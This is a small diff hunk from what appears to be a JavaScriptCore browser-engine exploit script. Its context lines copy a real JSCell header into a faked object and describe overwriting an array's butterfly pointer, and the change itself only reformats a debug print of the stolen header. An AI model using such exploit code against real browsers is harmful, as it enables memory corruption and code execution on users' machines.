@@ -502,7 +502,7 @@ for (var i = 0; i < 1000; ++i) {
     // Can now simply read a legitimate JSCell header and use it.
     var js_header = hax[0];
     container.header = js_header; 
-    print("Stolen Real Cell Header: " + js_header) 
+    print("Stolen Real Cell Header: " + hex1(floatAsQword(js_header)))
     /*// "Point" refers to changing the given array's butterfly
     // hax[1] = victim[]'s bfly, meaning that we can point victim[] using hax[1]
     //
